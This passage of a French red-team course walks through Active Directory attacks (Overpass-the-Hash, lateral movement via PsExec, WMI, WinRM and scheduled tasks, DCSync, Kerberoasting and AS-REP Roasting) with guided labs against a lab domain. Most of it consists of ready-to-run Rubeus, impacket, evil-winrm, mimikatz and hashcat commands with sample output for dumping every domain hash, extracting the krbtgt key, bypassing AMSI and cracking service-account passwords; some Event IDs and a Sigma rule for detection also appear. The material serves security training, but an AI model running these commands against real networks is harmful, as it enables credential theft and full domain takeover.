## 5. Overpass-the-Hash (T1550.002)

### 5.1 Principe

L'**Overpass-the-Hash** (également appelé Pass-the-Key ou PtH → TGT) est une technique qui **convertit un hash NTLM en ticket Kerberos TGT**. Cela permet :

1. De contourner les limitations du PtH (notamment WinRM qui refuse l'auth NTLM directe)
2. D'obtenir un TGT même sans avoir de session Kerberos active
3. D'utiliser des outils Kerberos qui ne supportent que l'auth par ticket

**Principe :**

```
Hash NTLM (RC4) ──> AS-REQ (avec RC4_HMAC) ──> KDC ──> TGT
```

### 5.2 Rubeus : asktgt

```powershell
# Demander un TGT avec un hash RC4 (NTLM)
Rubeus.exe asktgt /user:Administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt

# Avec un hash AES256
Rubeus.exe asktgt /user:Administrator /aes256:6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c /ptt

# Sans l'option /ptt (le ticket est sauvegardé dans un fichier)
Rubeus.exe asktgt /user:Administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /nowrap

# Avec upn et domaine spécifiques
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
```

**Sortie typique :**

```
  v2.2.0

[*] Action: Ask TGT

[*] Using domain controller: DC01.corp.local (10.0.1.10)
[+] TGT request successful!
[*] base64(ticket.kirbi):
doICkDCCAo2gAwIBBaEDAgEWooI...
[+] Ticket successfully injected!
```

**Vérification :**
```powershell
klist
dir \\DC01\C$
```

### 5.3 Impacket : getTGT.py

Depuis Linux, **getTGT.py** (impacket) permet de demander un TGT avec un hash :

```bash
# Demander un TGT avec hash RC4
impacket-getTGT corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c

# Le fichier est créé : Administrator.ccache dans le dossier courant
```

#### Utilisation du TGT avec impacket

```bash
export KRB5CCNAME=/path/to/Administrator.ccache

# Connexion SMB avec le ticket
impacket-smbexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local

# Connexion WMI avec le ticket
impacket-wmiexec -k -no-pass corp.local/Administrator@DC01.corp.local

# Connexion WinRM avec le ticket (contournement PtH !)
# Nécessite python3-pywinrm
```

**Pourquoi le ticket Kerberos contourne-t-il la limitation WinRM ?**

WinRM accepte l'authentification Kerberos (négociation SPNEGO) par défaut. Avec un TGT valide, l'attaquant peut obtenir un TGS pour les services HTTP/WinRM et s'authentifier via Kerberos au lieu de NTLM.

### 5.4 TP Guidé : From Hash to TGT to Shell

#### Objectif

À partir d'un hash NTLM, obtenir un shell interactif via WinRM (qui n'accepte pas le PtH direct) en passant par Overpass-the-Hash.

#### Scénario

```
Hash NTLM ──> getTGT.py ──> TGT.ccache ──> export KRB5CCNAME ──> evil-winrm (Kerberos)
```

#### Étape 1 : Obtenir le TGT depuis Linux

```bash
impacket-getTGT corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c
ls -la Administrator.ccache
```

#### Étape 2 : Configurer Kerberos

```bash
cat /etc/krb5.conf
```

**Contenu de `/etc/krb5.conf` :**

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    CORP.LOCAL = {
        kdc = DC01.corp.local
        admin_server = DC01.corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

```bash
export KRB5CCNAME=/path/to/Administrator.ccache
klist
```

#### Étape 3 : Shell avec evil-winrm (Kerberos)

```bash
sudo gem install evil-winrm
evil-winrm -i FILESERVER.corp.local -k
```

**Dans le shell :**
```
*Evil-WinRM* PS C:\> whoami
corp\administrator
*Evil-WinRM* PS C:\> hostname
FILESERVER
```

#### Étape 4 : Alternative avec impacket

```bash
impacket-wmiexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local
impacket-smbexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local
```

#### Étape 5 : Vérification des logs sur le DC

Sur le contrôleur de domaine (DC01), vérifier les événements générés :

```
Event ID 4768 — Un TGT a été demandé (AS-REQ)
  - Compte : Administrator
  - Type de chiffrement : RC4-HMAC (0x17)
```

> **Note OPSEC :** Le type de chiffrement RC4-HMAC dans un environnement qui utilise normalement AES256 est un indicateur de compromission pour les SOC avancés.

---

## 6. Mouvement latéral : PsExec, WMI, WinRM, Schtasks

### 6.1 Vue d'ensemble

| Outil | Protocole | Port | Mécanisme | Discrétion |
|---|---|---|---|---|
| **PsExec** (SysInternals) | SMB | 445 | Service SMB | Faible |
| **impacket-psexec** | SMB | 445 | Service SMB | Faible |
| **wmiexec.py** | WMI/DCOM | 135, 49152+ | Win32_Process.Create | Moyenne |
| **impacket-wmiexec** | WMI/DCOM | 135, 49152+ | Win32_Process.Create | Moyenne |
| **evil-winrm** | WinRM (HTTP/S) | 5985/5986 | PowerShell Remoting | Haute |
| **WinRM native** | WinRM | 5985/5986 | WS-Management | Haute |
| **impacket-smbexec** | SMB | 445 | Scheduled Task | Faible |
| **schtasks** | SMB/RPC | 445/135 | Tâche planifiée | Moyenne |

**Comparaison des EventIDs :**

| Outil | EventID | Description |
|---|---|---|
| **PsExec** | 4697 | Création de service |
| **PsExec** | 7045 | Service installé (System) |
| **WMI** | 4688 | Création de processus cmd.exe |
| **WMI** | 5861 | WMI-Activity (log WMI) |
| **WinRM** | 53504 | PowerShell Named Pipe |
| **WinRM** | 168 | WSMan Session |
| **schtasks** | 4698 | Tâche planifiée créée |
| **schtasks** | 106 | Tâche planifiée démarrée |

### 6.2 PsExec

#### Version SysInternals (Windows)

```powershell
# Exécution de commande
psexec.exe \\FILESERVER -u CORP\Administrator -p MonMDP cmd.exe

# Exécution en tant que SYSTEM
psexec.exe \\FILESERVER -s cmd.exe

# Copier et exécuter un fichier
psexec.exe \\FILESERVER -u CORP\Administrator -p MonMDP -c mimikatz.exe

# Mode interactif
psexec.exe \\FILESERVER -u CORP\Administrator -p MonMDP -i cmd.exe
```

#### impacket-psexec (Linux)

```bash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@FILESERVER.corp.local

# Avec un profil spécifique
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c -profile WIN10 corp.local/Administrator@10.0.1.50

# Binaire personnalisé
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c -custom-binary powershell.exe corp.local/Administrator@10.0.1.50
```

#### Fonctionnement technique de PsExec

1. PsExec se connecte à ADMIN$ via SMB
2. Upload du binaire PSEXESVC.exe dans ADMIN$
3. Création d'un service Windows via SC Manager
4. Le service démarre et crée un pipe nommé
5. Le client se connecte au pipe
6. Les commandes sont transmises via le pipe
7. La sortie est retournée via le pipe

### 6.3 WMI

#### impacket-wmiexec

```bash
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c -v corp.local/Administrator@10.0.1.50
```

#### wmic (Windows natif)

```cmd
# Exécution de commande via WMI
wmic /node:FILESERVER /user:CORP\Administrator /password:MonMDP process call create "cmd.exe /c whoami > C:\Windows\Temp\output.txt"
```

### 6.4 WinRM

#### evil-winrm

```bash
sudo gem install evil-winrm

# Connexion avec mot de passe
evil-winrm -i 10.0.1.50 -u Administrator -p 'MonMDP'

# Connexion avec ticket Kerberos
evil-winrm -i FILESERVER.corp.local -u Administrator -k

# Upload et download de fichiers
*Evil-WinRM* PS C:\> upload mimikatz.exe C:\Windows\Temp\mimikatz.exe
*Evil-WinRM* PS C:\> download C:\Windows\Temp\result.txt result.txt

# Chargement d'outils PowerShell
*Evil-WinRM* PS C:\> Bypass-4MSI
*Evil-WinRM* PS C:\> Invoke-Mimikatz
```

#### PowerShell New-PSSession

```powershell
$pass = ConvertTo-SecureString 'MonMDP' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\Administrator', $pass)

$session = New-PSSession -ComputerName FILESERVER.corp.local -Credential $cred
Invoke-Command -Session $session -ScriptBlock { whoami }

Enter-PSSession -ComputerName FILESERVER.corp.local -Credential $cred
```

### 6.5 Scheduled Tasks

#### Via schtasks

```cmd
schtasks /CREATE /S FILESERVER /U CORP\Administrator /P MonMDP `
    /TN "RedTeamUpdate" /TR "cmd.exe /c whoami > C:\Windows\Temp\schtask_out.txt" `
    /SC ONCE /ST 00:00 /RU SYSTEM

schtasks /RUN /S FILESERVER /U CORP\Administrator /P MonMDP /TN "RedTeamUpdate"

schtasks /DELETE /S FILESERVER /U CORP\Administrator /P MonMDP /TN "RedTeamUpdate" /F
```

#### Via impacket-smbexec (Linux)

```bash
impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

### 6.6 TP Guidé : 4 méthodes d'exécution distante

#### Objectif

Exécuter `whoami` sur `FILESERVER` via 4 méthodes différentes.

#### Étape 1 : Préparation

```bash
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
export KRB5CCNAME=/path/to/Administrator.ccache
```

#### Étape 2 : Méthode 1 — PsExec

```bash
echo "=== MÉTHODE 1 : PsExec ==="
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50 whoami
```

**Sortie :** `nt authority\system`

#### Étape 3 : Méthode 2 — WMI

```bash
echo "=== MÉTHODE 2 : WMI ==="
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50 whoami
```

**Sortie :** `corp\administrator`

#### Étape 4 : Méthode 3 — WinRM

```bash
echo "=== MÉTHODE 3 : WinRM ==="
impacket-getTGT corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c
export KRB5CCNAME=/path/to/Administrator.ccache
evil-winrm -i FILESERVER.corp.local -u Administrator -k
```

**Sortie :** `corp\administrator`

#### Étape 5 : Méthode 4 — Scheduled Task

```bash
echo "=== MÉTHODE 4 : Scheduled Task ==="
impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
whoami
```

**Sortie :** `nt authority\system`

#### Étape 6 : Comparaison des logs

```powershell
Get-WinEvent -LogName Security | Where-Object { $_.Id -in @(4624, 4697, 4688, 7045, 4698) } | Format-Table TimeCreated, Id, LevelDisplayName, Message -AutoSize -Wrap
```

**Tableau récapitulatif :**

| Méthode | EventIDs | Artefacts sur disque | Discrétion |
|---|---|---|---|
| **PsExec** | 4624, 4697, 7045 | Binaire uploadé + service créé | ★☆☆☆☆ |
| **WMI** | 4624, 4688, 5861 | Aucun (processus en mémoire) | ★★★☆☆ |
| **WinRM** | 4624, 53504, 168 | Logs PowerShell | ★★★★☆ |
| **Schtasks** | 4624, 4698, 106 | Tâche planifiée créée | ★★☆☆☆ |

---

## 7. DCSync (T1003.006)

### 7.1 Principe

Le **DCSync** est une technique qui permet à un attaquant de se faire passer pour un Contrôleur de Domaine (DC) et de demander la **réplication des données d'annuaire** via le protocole **MS-DRSR** (Directory Replication Service).

**Fonctionnement :**

```
┌────────────────┐                    ┌────────────────┐
│  Attaquant     │  MS-DRSR Request   │  DC Cible      │
│  (compte avec  │  ────────────────>  │  (ex: DC01)    │
│   droits de    │                    │                │
│   réplication) │  <────────────────  │                │
│                │  Réplication      │                │
│                │  (hashs NTLM,     │                │
│                │   clés Kerberos,  │                │
│                │   secrets LSA)    │                │
└────────────────┘                    └────────────────┘
```

**Pourquoi ça marche ?**

Le protocole MS-DRSR permet la réplication entre contrôleurs de domaine. Si un attaquant possède un compte avec les droits **"Replicating Directory Changes"** et **"Replicating Directory Changes All"**, il peut :

1. Demander la réplication des données de n'importe quel utilisateur
2. Obtenir le hash NTLM, le hash LM, les clés Kerberos
3. Extraire le hash du compte KRBTGT (pour créer des Golden Tickets)

**Droits requis :** (par défaut : Administrateurs du domaine, Contrôleurs de domaine, Enterprise Admins)

| Droite | Description |
|---|---|
| `DS-Replication-Get-Changes` (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) | Lire les changements de réplication |
| `DS-Replication-Get-Changes-All` (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) | Lire TOUS les changements de réplication |
| `DS-Replication-Get-Changes-In-Filtered-Set` (89e95b76-444d-4c62-991a-0facbeda640c) | Réplication filtrée |

### 7.2 Outils pour le DCSync

#### secretsdump.py (impacket)

```bash
# DCSync complet (tous les utilisateurs)
impacket-secretsdump -just-dc corp.local/Administrator@DC01.corp.local

# Avec hash NTLM (PtH + DCSync)
impacket-secretsdump -just-dc -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@DC01.corp.local

# Avec ticket Kerberos
export KRB5CCNAME=/path/to/Administrator.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@DC01.corp.local

# Extraction uniquement NTLM
impacket-secretsdump -just-dc-ntlm corp.local/Administrator@DC01.corp.local

# Extraction d'un utilisateur spécifique
impacket-secretsdump -just-dc-user jdupont corp.local/Administrator@DC01.corp.local

# Extraction complète (NTDS + SAM + LSA)
impacket-secretsdump corp.local/Administrator@DC01.corp.local
```

**Paramètres importants :**

| Option | Description |
|---|---|
| `-just-dc` | Extrait uniquement le NTDS.dit (DCSync complet) |
| `-just-dc-ntlm` | Extrait uniquement les hashs NTLM (plus rapide) |
| `-just-dc-user USER` | Extrait un utilisateur spécifique |
| `-hashes LM:NTLM` | Authentification par hash |
| `-k` | Utiliser l'authentification Kerberos |
| `-no-pass` | Pas de mot de passe (utilise le ticket) |
| `-user-status` | Affiche le statut des comptes (actif/désactivé) |

**Sortie typique :**

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e:::
jdupont:1103:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::
svc_sql:1200:aad3b435b51404eeaad3b435b51404ee:8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c:::

[*] Kerberos keys extracted:
Administrator:aes256-cts-hmac-sha1-96:6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f
Administrator:aes128-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
Administrator:des-cbc-md5:0d1e2f3a4b5c6d7e

[*] Cleaning up...
```

#### Mimikatz lsadump::dcsync

```mimikatz
# DCSync de tous les utilisateurs
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# DCSync d'un utilisateur spécifique
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# DCSync du compte KRBTGT (pour Golden Ticket)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# DCSync avec sortie formatée pour hashcat
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator /csv
```

### 7.3 Prérequis et détection

#### Droits nécessaires

| Groupe | Droit de réplication |
|---|---|
| **Domain Admins** | Oui |
| **Enterprise Admins** | Oui |
| **Administrators** (du domaine) | Oui |
| **Domain Controllers** | Oui (compte machine des DC) |
| **Comptes délégués** | Si droits délégués explicitement |

#### Détection : EventID 4662

Windows Security Log génère l'EventID **4662** pour les accès aux objets Active Directory.

| GUID | Signification |
|---|---|
| `19195a5b-6da0-11d0-afd3-00c04fd930c7` | SamDomain (objet DS) |
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All |
| `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |

#### Règle Sigma pour DCSync

```yaml
title: DCSync Attack via Directory Replication
id: 6f4c3b2a-1d8e-4f7a-9c5b-3a2d1e0f4c8b
status: experimental
description: Détecte les tentatives de DCSync via les droits de réplication Active Directory
references:
  - https://attack.mitre.org/techniques/T1003/006/
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectType: '19195a5b-6da0-11d0-afd3-00c04fd930c7'
    AccessMask:
      - '0x100'
      - '0x200'
    Properties:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  condition: selection
falsepositives:
  - Réplication légitime entre DCs
  - Outils d'administration AD légitimes
level: high
```

### 7.4 TP Guidé : DCSync pour extraire tous les hashs du domaine

#### Objectif

Depuis un compte avec droits d'administration domaine, effectuer un DCSync pour extraire tous les hashs du domaine.

#### Scénario

```
Compte: CORP\Administrator (membre de Domain Admins)
DC: DC01.corp.local (10.0.1.10)
Machine attaquante: Kali Linux (10.0.1.15)
```

#### Étape 1 : Vérification des droits

```bash
crackmapexec smb 10.0.1.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
crackmapexec smb 10.0.1.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --users
```

#### Étape 2 : DCSync

```bash
impacket-secretsdump -just-dc corp.local/Administrator@DC01.corp.local
impacket-secretsdump -just-dc -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@DC01.corp.local > dc_hashes.txt
```

#### Étape 3 : Analyser les résultats

```bash
grep -E '^[^:]+:[0-9]+:' dc_hashes.txt | cut -d: -f1,4 > ntlm_hashes.txt
wc -l ntlm_hashes.txt
grep -i 'admin\|service\|svc_\|backup\|sql' dc_hashes.txt
```

**Identifier les comptes clés :**

| Compte | RID | Intérêt |
|---|---|---|
| `Administrator` | 500 | Admin domaine par défaut |
| `krbtgt` | 502 | Clé de chiffrement des tickets (Golden Ticket) |
| `svc_sql` | 1200 | Compte de service SQL |
| `backup_user` | 1500 | Compte de sauvegarde |

#### Étape 4 : Extraire le KRBTGT

```bash
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@DC01.corp.local
# $krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e:::
```

#### Étape 5 : Nettoyage

```bash
shred -u dc_hashes.txt ntlm_hashes.txt
```

---

## 8. Kerberoasting (T1558.003)

### 8.1 Principe

Le **Kerberoasting** est une technique qui permet d'obtenir le hash (TGS) d'un compte de service Active Directory, puis de le casser offline pour récupérer son mot de passe en clair.

**Fonctionnement :**

```
┌────────────────┐                    ┌────────────────┐
│  Attaquant     │  TGS-REQ           │  KDC (DC)      │
│  (n'importe    │  (SPN: sql/srv01)  │                │
│   quel compte  │  ────────────────>  │                │
│   domaine)     │                    │                │
│               │  <────────────────  │                │
│               │  TGS-REP           │                │
│               │  (hash chiffré     │                │
│               │   avec clé du      │                │
│               │   compte service)  │                │
└────────────────┘                    └────────────────┘
┌────────────────┐
│  Offline       │
│  ────────────  │
│  TGS cracké   │
│  avec hashcat  │
└────────────────┘
```

**Pourquoi ça marche ?**

1. N'importe quel utilisateur du domaine peut demander un TGS pour n'importe quel SPN
2. Le TGS est chiffré avec la clé (hash NTLM) du **compte de service**
3. L'attaquant peut tenter de casser ce hash offline, sans interaction avec le domaine
4. Les mots de passe des comptes de service sont souvent faibles ou par défaut

**SPN (Service Principal Name) :**

```
<service>/<host>:<port>/<realm>
```

Exemples :
- `MSSQLSvc/SRV01.corp.local:1433` — Service SQL Server
- `HTTP/WEBSRV01.corp.local` — Service web (IIS)
- `CIFS/FILESERVER.corp.local` — Partage de fichiers

### 8.2 Outils pour le Kerberoasting

#### impacket-GetUserSPNs.py

```bash
# Découverte des comptes de service + demande de TGS
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request

# Avec hash NTLM
impacket-GetUserSPNs corp.local/jdupont -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.0.1.10 -request

# Format pour hashcat
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -format hashcat

# Sortie vers un fichier
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -outputfile kerberoast_tgs.txt

# Lister uniquement les SPN (sans demander les TGS)
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10
```

**Paramètres importants :**

| Option | Description |
|---|---|
| `-request` | Demander les TGS (nécessaire pour obtenir les hashs) |
| `-format hashcat` | Format compatible hashcat (recommandé) |
| `-outputfile FILE` | Sauvegarder dans un fichier |
| `-dc-ip IP` | Adresse IP du DC (évite la résolution DNS) |
| `-hashes LM:NTLM` | Authentification par hash |
| `-k` | Authentification Kerberos |

**Sortie typique :**

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Getting domain information
[*] Found 3 users with SPNs:

ServicePrincipalName                                 Name           MemberOf
---------------------------------------------------  -------------  ---------
MSSQLSvc/SRV01.corp.local:1433                       svc_sql        CN=Service Accounts,CN=Users,DC=corp,DC=local
HTTP/WEBSRV01.corp.local                             svc_web        CN=Service Accounts,CN=Users,DC=corp,DC=local
ldap/DC01.corp.local/CORP.LOCAL                      svc_ldap       CN=Service Accounts,CN=Users,DC=corp,DC=local

[*] Getting TGS for each user...

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/SRV01.corp.local:1433*$8f9a0b1c2d3e4f5a$4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
```

#### Rubeus kerberoast

```powershell
# Kerberoasting basique
Rubeus.exe kerberoast

# Avec sortie formatée pour hashcat
Rubeus.exe kerberoast /outfile:tgs_hashes.txt /format:hashcat

# Cibler un utilisateur spécifique
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt

# Avec statistiques
Rubeus.exe kerberoast /stats

# Mode OPSEC
Rubeus.exe kerberoast /opsec
```

### 8.3 Cracking des hashs TGS

#### Format du hash TGS

```
$krb5tgs$23$*<user>$<realm>$<spn>*$<enc_part>$<hash>
```

Exemple :
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/SRV01.corp.local:1433*$8f9a0b1c2d3e4f5a$4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
```

#### Avec Hashcat

```bash
# Mode 13100 = Kerberos TGS RC4
hashcat -m 13100 kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# Avec règles
hashcat -m 13100 kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt

# Si AES (type 18 ou 17)
# Type 18 (AES256) : -m 19700
# Type 17 (AES128) : -m 19600
hashcat -m 19700 kerberoast_aes_tgs.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

**Paramètres hashcat :**

| Option | Description |
|---|---|
| `-m 13100` | Mode : Kerberos TGS (RC4) |
| `-m 19700` | Mode : Kerberos TGS (AES256) |
| `-a 0` | Attaque par dictionnaire (par défaut) |
| `-r` | Fichier de règles |
| `-o` | Fichier de sortie |
| `-O` | Mode optimisation |
| `-w 4` | Workload profile (4 = max performance) |

#### Avec John the Ripper

```bash
john --format=krb5tgs kerberoast_tgs.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=krb5tgs --show kerberoast_tgs.txt
```

### 8.4 TP Guidé : Kerberoasting complet

#### Objectif

1. Identifier les comptes de service du domaine
2. Demander leurs TGS
3. Casser les hashs offline
4. Utiliser les mots de passe obtenus

#### Étape 1 : Découverte des SPN

```bash
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10
```

**Questions :**
1. Combien de comptes de service sont trouvés ?
2. Quels sont leurs SPN ?
3. Sont-ils membres de groupes privilégiés ?

#### Étape 2 : Demander les TGS

```bash
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -outputfile all_tgs.txt
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -outputfile svc_sql_tgs.txt -users svc_sql
```

#### Étape 3 : Cracking

```bash
hashcat -m 13100 all_tgs.txt /usr/share/wordlists/rockyou.txt -o cracked_tgs.txt
hashcat -m 13100 all_tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked_tgs.txt
hashcat -m 13100 --show all_tgs.txt
cat cracked_tgs.txt
```

#### Étape 4 : Utilisation des mots de passe

```bash
crackmapexec smb 10.0.1.50 -u svc_sql -p 'SqlP@ss123!'
```

#### Étape 5 : Logs sur le DC

```powershell
Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4769 -and $_.Properties[8].Value -like '*MSSQLSvc*' }
```

---

## 9. AS-REP Roasting (T1558.004)

### 9.1 Principe

L'**AS-REP Roasting** est une technique qui cible les comptes Active Directory pour lesquels la **pré-authentification Kerberos est désactivée** (UF_DONT_REQUIRE_PREAUTH).

**Fonctionnement normal :**

```
1) Client → DC : AS-REQ (timestamp chiffré avec hash NTLM du client)
2) DC → Client : AS-REP (TGT chiffré avec clé KRBTGT)
```

**Sans pré-authentification :**

```
1) Attaquant → DC : AS-REQ (pour le compte cible, sans timestamp)
2) DC → Attaquant : AS-REP (contient un bloc chiffré avec la clé du compte cible)
3) Attaquant : cracke le bloc offline (hashcat / john)
```

**Pourquoi ça marche ?**

L'AS-REP contient une partie des données chiffrées avec la clé du compte cible. Comme l'attaquant peut demander cette réponse sans authentification, il peut tenter de casser cette partie chiffrée offline.

### 9.2 Outils pour l'AS-REP Roasting

#### impacket-GetNPUsers.py

```bash
# Demander l'AS-REP pour tous les utilisateurs sans pré-authentification
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt

# Avec une liste d'utilisateurs
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt

# Format hashcat
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

**Paramètres :**

| Option | Description |
|---|---|
| `-no-pass` | Pas de mot de passe (pas nécessaire) |
| `-usersfile FILE` | Fichier contenant les noms d'utilisateurs |
| `-format hashcat` | Format compatible hashcat |
| `-outputfile FILE` | Fichier de sortie |
| `-dc-ip IP` | Adresse du contrôleur de domaine |

**Sortie typique :**

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Getting domain information
[-] User jdupont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] User srochard has UF_DONT_REQUIRE_PREAUTH set!
$krb5asrep$23$srochard@CORP.LOCAL:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c
```

#### Rubeus asreproast

```powershell
Rubeus.exe asreproast
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
Rubeus.exe asreproast /user:users.txt /format:hashcat
Rubeus.exe asreproast /domain:corp.local /format:hashcat
```

#### Détection des comptes sans pré-authentification

```powershell
# Avec PowerView
Get-DomainUser -PreauthNotRequired -Properties samaccountname,userprincipalname
```

### 9.3 Cracking des hashs AS-REP

#### Format du hash

```
$krb5asrep$23$<user>@<realm>:<hash>
```

Exemple :
```
$krb5asrep$23$srochard@CORP.LOCAL:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c
```

#### Avec Hashcat

```bash
# Mode 18200 = Kerberos AS-REP RC4
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked_asrep.txt

# Avec règles
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked_asrep.txt

# Si AES (type 18 ou 17)
# Type 18 (AES256) : -m 19900
# Type 17 (AES128) : -m 19800
```

#### Avec John the Ripper

```bash
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show asrep_hashes.txt
```

### 9.4 TP Guidé : AS-REP Roasting

#### Objectif

1. Créer une liste d'utilisateurs du domaine
2. Tester chaque utilisateur pour l'attribut `DONT_REQUIRE_PREAUTH`
3. Récupérer les AS-REP des comptes vulnérables
4. Casser les hashs offline

#### Étape 1 : Générer une liste d'utilisateurs

```bash
# Méthode 1 : Enumération avec crackmapexec
crackmapexec smb 10.0.1.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --users > users_raw.txt
grep -oP '^[^\s]+' users_raw.txt > users.txt

# Méthode 2 : impacket-lookupsid
impacket-lookupsid corp.local/Administrator:MonMDP@10.0.1.10 | grep -oP '.*\\(.*)' | sort -u > users.txt
```

#### Étape 2 : AS-REP Roasting

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

#### Étape 3 : Cracking

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --show
```

#### Étape 4 : Utilisation des credentials

```bash
crackmapexec smb 10.0.1.50 -u srochard -p 'MotDePasseTrouvé'
```

---

## 10. TP Synthèse : De Local Admin à Domain Admin

### 10.1 Scénario SCAD

**SCAD = Séquence Complète d'Attaque Dirigée**

